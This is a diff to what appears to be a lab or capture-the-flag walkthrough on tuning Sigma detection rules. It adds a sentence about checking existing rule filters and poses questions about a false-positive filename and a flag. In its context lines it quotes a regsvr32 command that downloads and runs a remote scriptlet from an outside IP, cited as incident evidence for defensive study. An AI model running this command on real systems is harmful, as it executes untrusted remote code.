@@ -32,6 +32,8 @@ The incident_report.md file shows us the following commands for PR#1. They are u
 >
 > regsvr32.exe /s /n /u /i:http://45.77.12.9/s.sct scrobj.dll
 
+First I checked what the current Sigma rule filters to see what can be tuned.
+
 ### What is the filename of the internal tool that may cause false positives in PR#2 if not properly filtered?
 
 ### What is the PR#2 flag?
